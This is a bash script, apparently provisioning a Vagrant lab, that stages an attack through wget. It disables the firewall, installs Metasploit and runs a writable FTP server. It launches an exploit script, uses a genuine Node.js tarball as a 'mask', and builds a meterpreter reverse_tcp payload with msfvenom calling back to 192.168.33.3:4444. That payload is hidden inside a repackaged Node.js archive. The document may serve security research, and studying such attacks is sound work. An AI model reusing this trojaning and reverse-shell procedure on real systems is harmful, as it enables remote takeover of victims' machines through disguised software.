#!/bin/bash
# sudo systemctl stop firewalld
sudo ufw disable

# install essential packages
sudo DEBIAN_FRONTEND=noninteractive apt-get -y update
sudo DEBIAN_FRONTEND=noninteractive apt-get -y install build-essential
sudo DEBIAN_FRONTEND=noninteractive apt-get -y install python-pip python-dev
# install pythonftpdlib package
sudo pip install pyftpdlib
# install Metasploit framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
# in a new directory run ftp server
rm -rf /tmp/ftptest
mkdir /tmp/ftptest
cd /tmp/ftptest
####################################################################
# copy the Node.js tar file to /tmp/ftptest
cp /vagrant/provision/node-v12.8.1-linux-x64.tar.gz /tmp/ftptest
# open the tar file to add the payload later
sudo tar -C /tmp/ftptest --strip-components 1 -xzf node-v12.8.1-linux-x64.tar.gz
rm node-v12.8.1-linux-x64.tar.gz
####################################################################
# configure ftp server and starting it in the background
# -m specifies the module name; -p port; -w write access
sudo python -m pyftpdlib -p21 -w &
# wait for fptserver to be started
sleep 5
# in a new directory run web server
rm -rf /tmp/webtest
mkdir /tmp/webtest
cd /tmp/webtest
####################################################################
# put the same but benign tar file in the directory as a mask
wget https://nodejs.org/dist/v12.8.1/node-v12.8.1-linux-x64.tar.gz
cp /vagrant/provision/wget-exploit3.py /tmp/webtest
####################################################################
cp /vagrant/provision/exploit.rc /tmp/ftptest
sudo python3 /tmp/webtest/wget-exploit3.py > /vagrant/provision/exploit-output.txt & sleep 1
####################################################################
# run Metasploit and create payload
sudo msfconsole
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.33.3 lport=4444 -f elf > shell.elf
sudo chmod +x shell.elf
# put payload in the Node.js directory and package into a new tar file
sudo mv shell.elf /tmp/ftptest/bin
cd /tmp
sudo tar -czvf node-v12.8.1-linux-x64.tar.gz ftptest
sudo mv node-v12.8.1-linux-x64.tar.gz ftptest
cd /tmp/ftptest
chmod +x exploit.rc
#sudo msfconsole -r exploit.rc
